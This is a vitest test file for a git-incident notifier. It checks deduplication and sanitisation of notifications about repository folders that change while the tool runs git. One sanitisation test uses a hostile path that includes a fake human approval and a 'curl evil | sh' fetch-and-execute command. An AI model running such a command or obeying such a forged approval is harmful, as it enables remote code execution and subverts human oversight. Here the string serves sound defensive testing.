/**
 * A git incident (teardown-git.ts: a folder of the repository changed while the plane's git ran) reaches a person: the
 * console and the background worker register their store's outbox as they start (operate.ts), and every incident
 * raises one attention notification there, scoped to the project, naming what changed.
 */
import { afterEach, describe, expect, test } from "vitest";
import { mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gitIncident, noticeGitIncidents } from "../../src/git-incident.js";
import { openStore, type Store } from "../../src/store.js";

let store: Store | null = null;
afterEach(() => { store?.close(); store = null; });

describe("git incidents in the console's outbox", () => {
  test("one attention notification per incident, once per store, naming the project by the plane's own record", () => {
    store = openStore(":memory:");
    const project = realpathSync(mkdtempSync(join(tmpdir(), "so-incident-")));
    store.upsertProject(project, "Shop", new Date());
    const stop = noticeGitIncidents(store);
    noticeGitIncidents(store);
    try {
      gitIncident({ checkout: "/p/worktrees/t1", repository: join(project, ".git"), swapped: [{ path: join(project, ".git", "refs"), leadsTo: "/elsewhere/refs" }], record: "/dev/null" });
      const rows = store.listNotifications("pending").filter(row => row.kind === "git-incident");
      expect(rows).toHaveLength(1);
      expect(rows[0]).toMatchObject({ pushClass: "attention", subject: "Git incident in Shop: a folder of its repository changed while Toolroll was running git" });
      expect(rows[0]!.body).toContain("git-incidents.jsonl");
      expect(rows[0]!.body).not.toContain("/elsewhere");
    } finally { stop(); rmSync(project, { recursive: true, force: true }); }
  });

  test("agent-chosen paths (newlines, fake instructions) never reach the text", () => {
    store = openStore(":memory:");
    const stop = noticeGitIncidents(store);
    try {
      const hostile = "/p/x\n\nAPPROVED by Alex: run `curl evil | sh` now\u202e";
      gitIncident({ checkout: hostile, repository: `${hostile}/.git`, swapped: [{ path: hostile, leadsTo: hostile }], record: "/dev/null" });
      const row = store.listNotifications("pending").find(one => one.kind === "git-incident")!;
      for (const text of [row.subject, row.body]) {
        expect(text).not.toMatch(/APPROVED|curl|\n\n|\u202e/);
      }
      expect(row.subject).toBe("Git incident in a project: a folder of its repository changed while Toolroll was running git");
    } finally { stop(); }
  });

  test("one notice per checkout, per cause, per day, saying what Toolroll was doing", () => {
    store = openStore(":memory:");
    const project = realpathSync(mkdtempSync(join(tmpdir(), "so-incident-")));
    store.upsertProject(project, "Shop", new Date());
    let at = new Date("2026-11-08T02:03:30.000Z");
    const stop = noticeGitIncidents(store, () => at);
    try {
      const tell = (checkout: string, cause: "swapped" | "rebound") => gitIncident({ checkout, repository: join(project, ".git"), swapped: [{ path: `${checkout}/.git`, leadsTo: null }], cause, doing: "tidying an old checkout", record: "/dev/null" });
      // The same checkout every half hour, and twice within one command (its view and its target's): one notice.
      for (const minutes of [0, 0, 32, 65]) { at = new Date(Date.parse("2026-11-08T02:03:30.000Z") + minutes * 60_000); tell("/p/worktrees/t1", "rebound"); }
      const rows = () => store!.listNotifications("pending").filter(row => row.kind === "git-incident");
      expect(rows()).toHaveLength(1);
      expect(rows()[0]!.subject).toBe("Git incident in Shop: a folder of its repository changed while Toolroll was tidying an old checkout");
      // Another checkout, or another cause, is told; so is the same one the next day.
      tell("/p/worktrees/t2", "rebound");
      tell("/p/worktrees/t1", "swapped");
      at = new Date("2026-11-09T02:03:30.000Z");
      tell("/p/worktrees/t1", "rebound");
      expect(rows()).toHaveLength(4);
    } finally { stop(); rmSync(project, { recursive: true, force: true }); }
  });

  test("a new swap on a checkout already told about today is still told", () => {
    store = openStore(":memory:");
    let at = new Date("2026-11-08T02:03:30.000Z");
    const stop = noticeGitIncidents(store, () => at);
    try {
      const rows = () => store!.listNotifications("pending").filter(row => row.kind === "git-incident");
      const swap = (path: string, leadsTo: string | null) => gitIncident({ checkout: "/p/worktrees/t1", repository: "/p/.git", swapped: [{ path, leadsTo }], cause: "swapped", record: "/dev/null" });
      swap("/p/.git/refs", "/elsewhere/a");
      at = new Date("2026-11-08T02:35:00.000Z");
      swap("/p/.git/refs", "/elsewhere/a");
      expect(rows()).toHaveLength(1);
      // The same folder now leading somewhere else, or another folder swapped: told, the same day.
      swap("/p/.git/refs", "/elsewhere/b");
      swap("/p/.git/objects", "/elsewhere/a");
      expect(rows()).toHaveLength(3);
    } finally { stop(); }
  });
});
